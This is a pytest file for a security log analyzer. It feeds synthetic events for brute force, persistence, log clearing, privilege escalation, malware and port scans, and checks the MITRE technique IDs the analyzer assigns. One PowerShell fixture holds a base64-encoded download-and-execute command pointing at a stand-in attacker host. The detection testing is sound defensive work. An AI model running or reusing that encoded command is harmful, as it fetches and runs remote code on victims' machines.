import os
import pytest

from app.services.log_analyzer import log_analyzer
from app.services.log_parser import parse_log_content


def test_detect_bruteforce():
    events = [
        {
            "id": f"evt-{i}",
            "timestamp": f"2026-10-21T10:00:0{i}Z",
            "level": "ERROR",
            "source": "sshd",
            "event_id": "4625",
            "message": f"Failed password for invalid user admin from 192.168.1.105 port {50000+i}",
            "raw": "",
        }
        for i in range(6)
    ]
    findings = log_analyzer.analyze_events(events)
    assert any(f["category"] == "brute_force" for f in findings)
    bf = next(f for f in findings if f["category"] == "brute_force")
    assert bf["mitre_technique"] == "T1110"
    assert bf["severity"] == "high"
    assert len(bf["evidence"]) >= 5


def test_detect_account_compromise():
    events = [
        {
            "id": f"evt-fail-{i}",
            "timestamp": f"2026-10-21T10:00:0{i}Z",
            "level": "ERROR",
            "source": "auth",
            "event_id": "4625",
            "message": "Failed password for user svc_backup from 10.0.0.50",
            "raw": "",
        }
        for i in range(4)
    ]
    events.append({
        "id": "evt-success",
        "timestamp": "2026-10-21T10:00:15Z",
        "level": "INFO",
        "source": "auth",
        "event_id": "4624",
        "message": "Accepted password for user svc_backup from 10.0.0.50",
        "raw": "",
    })

    findings = log_analyzer.analyze_events(events)
    assert any(f["category"] == "account_compromise" for f in findings)
    comp = next(f for f in findings if f["category"] == "account_compromise")
    assert comp["severity"] == "critical"
    assert comp["mitre_technique"] == "T1078"


def test_detect_persistence():
    events = [{
        "id": "evt-svc",
        "timestamp": "2026-10-21T11:00:00Z",
        "level": "INFO",
        "source": "Service Control Manager",
        "event_id": "7045",
        "message": "A service was installed in the system: evil_backdoor.exe",
        "raw": "",
    }]
    findings = log_analyzer.analyze_events(events)
    assert any(f["category"] == "persistence" for f in findings)
    p = next(f for f in findings if f["category"] == "persistence")
    assert p["mitre_technique"] == "T1543"


def test_detect_defense_evasion():
    events = [{
        "id": "evt-clr",
        "timestamp": "2026-10-21T11:05:00Z",
        "level": "WARNING",
        "source": "Security",
        "event_id": "1102",
        "message": "The audit log was cleared by Administrator",
        "raw": "",
    }]
    findings = log_analyzer.analyze_events(events)
    assert any(f["category"] == "defense_evasion" for f in findings)
    de = next(f for f in findings if f["category"] == "defense_evasion")
    assert de["mitre_technique"] == "T1070"


def test_detect_privilege_escalation():
    events = [{
        "id": "evt-pe",
        "timestamp": "2026-10-21T11:10:00Z",
        "level": "WARNING",
        "source": "Security",
        "event_id": "4732",
        "message": "A member was added to administrators local group: rogue_admin",
        "raw": "",
    }]
    findings = log_analyzer.analyze_events(events)
    assert any(f["category"] == "privilege_escalation" for f in findings)
    pe = next(f for f in findings if f["category"] == "privilege_escalation")
    assert pe["mitre_technique"] == "T1098"


def test_detect_malware():
    events = [{
        "id": "evt-mal",
        "timestamp": "2026-10-21T11:15:00Z",
        "level": "CRITICAL",
        "source": "Microsoft-Windows-Windows Defender",
        "event_id": "1116",
        "message": "Microsoft Defender Antivirus has detected malware: Ransom:Win32/WannaCrypt",
        "raw": "",
    }]
    findings = log_analyzer.analyze_events(events)
    assert any(f["category"] == "malware" for f in findings)
    mal = next(f for f in findings if f["category"] == "malware")
    assert mal["severity"] == "critical"
    assert mal["mitre_technique"] == "T1204"


def test_detect_suspicious_powershell():
    events = [{
        "id": "evt-ps",
        "timestamp": "2026-10-21T11:20:00Z",
        "level": "WARNING",
        "source": "PowerShell",
        "event_id": "4104",
        "message": "powershell.exe -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5n('http://evil.com')",
        "raw": "",
    }]
    findings = log_analyzer.analyze_events(events)
    assert any(f["category"] == "suspicious_execution" for f in findings)
    ps = next(f for f in findings if f["category"] == "suspicious_execution")
    assert ps["mitre_technique"] == "T1059.001"


def test_detect_reconnaissance():
    events = [
        {
            "id": f"evt-scan-{i}",
            "timestamp": f"2026-10-21T11:25:0{i}Z",
            "level": "WARNING",
            "source": "firewall",
            "event_id": None,
            "message": f"connection refused from 192.168.1.200 to port {80+i}",
            "raw": "",
        }
        for i in range(6)
    ]
    findings = log_analyzer.analyze_events(events)
    assert any(f["category"] == "reconnaissance" for f in findings)


def test_analyze_sample_auth_bruteforce_file():
    sample_path = os.path.join(
        os.path.dirname(os.path.dirname(__file__)), "sample_logs", "auth_bruteforce.log"
    )
    with open(sample_path, "r", encoding="utf-8") as f:
        content = f.read()

    events = parse_log_content(content, filename="auth_bruteforce.log")
    assert len(events) >= 8

    findings = log_analyzer.analyze_events(events)
    assert any(f["category"] == "brute_force" for f in findings)
    bf = next(f for f in findings if f["category"] == "brute_force")
    assert "203.0.113.195" in bf["description"]
    assert bf["mitre_technique"] == "T1110"
    # Also check presence of subsequent attack techniques in the sample file
    techniques = {f.get("mitre_technique") for f in findings if f.get("mitre_technique")}
    assert "T1110" in techniques
    assert any("T1078" in t for t in techniques)
    assert any("T1059" in t for t in techniques)
    assert any("T1543" in t for t in techniques)
